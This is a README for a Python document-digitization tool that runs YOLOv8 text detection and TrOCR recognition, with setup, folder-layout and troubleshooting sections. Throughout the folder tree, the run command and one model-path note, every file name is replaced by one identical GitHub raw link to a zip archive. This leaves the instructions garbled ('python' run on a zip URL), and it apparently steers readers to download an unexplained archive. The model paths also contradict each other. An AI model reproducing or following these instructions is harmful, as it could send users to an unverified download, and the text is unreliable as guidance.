DOCUMENT DIGITIZATION INFERENCE - INSTRUCTIONS
==============================================

SETUP
-----
1. Make sure Python is installed (Python 3.8+ recommended).
2. Install required Python libraries:

   pip install torch torchvision transformers pillow opencv-python ultralytics


FOLDER STRUCTURE
----------------
Project should look like this:

project_folder/
│
├── models/
│   ├── https://raw.githubusercontent.com/Vimal-AFK/dehado/main/westbound/dehado.zip
│   └── Fine_tuned_TrOCR_transfer learn_model/
│       └── final/
│           ├── https://raw.githubusercontent.com/Vimal-AFK/dehado/main/westbound/dehado.zip
│           ├── https://raw.githubusercontent.com/Vimal-AFK/dehado/main/westbound/dehado.zip
│           ├── https://raw.githubusercontent.com/Vimal-AFK/dehado/main/westbound/dehado.zip
│           └── ... (TrOCR files)
│
├── IMAGES/                     --> Place input https://raw.githubusercontent.com/Vimal-AFK/dehado/main/westbound/dehado.zip images here
│   └── https://raw.githubusercontent.com/Vimal-AFK/dehado/main/westbound/dehado.zip
│
├── predictions_of_IMAGES/     --> Output JSONs will be saved here
│
└── https://raw.githubusercontent.com/Vimal-AFK/dehado/main/westbound/dehado.zip               --> The main Python script


RUNNING THE SCRIPT
------------------
1. Open terminal or command prompt.
2. Navigate to your project directory.
3. Run:

   python https://raw.githubusercontent.com/Vimal-AFK/dehado/main/westbound/dehado.zip

4. The script will:
   - Load the YOLOv8 and TrOCR models.
   - Detect text regions in images from the `IMAGES/` folder.
   - Run OCR on each region.
   - Save outputs as JSON files in `predictions_of_IMAGES/` folder.


ADDING MORE IMAGES
------------------
- Simply add new `.jpg`, `.jpeg`, or `.png` images to the `IMAGES/` folder.
- Run the script again.
- Already processed images will be skipped automatically.


NOTES
-----
- You must have your trained model weights for YOLOv8 in: https://raw.githubusercontent.com/Vimal-AFK/dehado/main/westbound/dehado.zip
- You must have the trained TrOCR model in: models/conservative_trocr_model/final/

TROUBLESHOOTING
---------------
- If you get a CUDA error, switch to CPU by ensuring PyTorch is using 'cpu'.
- If output JSONs are empty, check if bounding boxes are detected by YOLO.
- If script throws errors, ensure correct model paths and that folders exist.


